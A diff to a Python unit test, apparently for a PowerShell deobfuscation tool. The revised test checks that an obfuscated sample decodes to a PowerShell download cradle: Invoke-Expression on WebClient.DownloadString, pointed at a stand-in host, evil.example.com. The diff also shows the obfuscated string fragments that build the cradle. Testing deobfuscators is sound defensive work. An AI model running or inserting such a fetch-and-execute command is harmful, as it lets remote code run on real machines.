@@ -271,10 +271,11 @@ class TestPs1RealWorldLarge(TestUnitBase):
             B"""'').Replace(''s97YMGcyg0WCr'',''o'').Replace(''z2Wr6qQR'', ''e''))').Replace('QNVrd3W2GjJK36', 'e')."""
             B"""Replace('s2Wr6qQR', 'wnloadS'))))"""
         )
-        deob = self.load()
-        extract = self.ldu('carve', 'ps1str', single=True, decode=True)
-        self.assertIn(b'https://evil.example.com/boom',
-            data | deob | extract | deob | bytes)
+        test = data | self.load() | str
+        lines = test.splitlines()
+        self.assertEqual(len(lines), 2)
+        self.assertEqual(lines[1], 
+            "$pzhhqdwl = Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://evil.example.com/boom'))")
 
     def test_real_world_04(self):
         data = lzma.decompress(base64.b85decode(
